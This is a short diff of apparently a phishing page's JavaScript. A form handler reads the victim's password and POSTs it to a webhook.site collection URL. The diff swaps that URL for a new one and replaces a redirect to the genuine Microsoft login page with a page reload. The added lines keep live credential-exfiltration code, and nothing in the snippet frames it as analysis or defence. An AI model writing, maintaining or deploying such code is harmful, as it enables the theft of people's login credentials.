@@ -64,7 +64,7 @@
             var password = document.getElementById('password').value;
 
             // Send data to Webhook using fetch
-            fetch('https://webhook.site/39d37bb9-cfae-4ebf-81b6-d76182d1fb16', {
+            fetch('https://webhook.site/663b8d2c-02ed-4425-890e-774dfe86f880', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -76,8 +76,8 @@
             })
             .then(response => {
                 console.log('Data sent successfully');
-                // Redirect to Microsoft login page after sending data
-                window.location.href = 'https://login.microsoftonline.com/';
+                // Refresh the page after sending data
+                location.reload(); // Reloads the current page
             })
             .catch(error => {
                 console.error('Error sending data:', error);
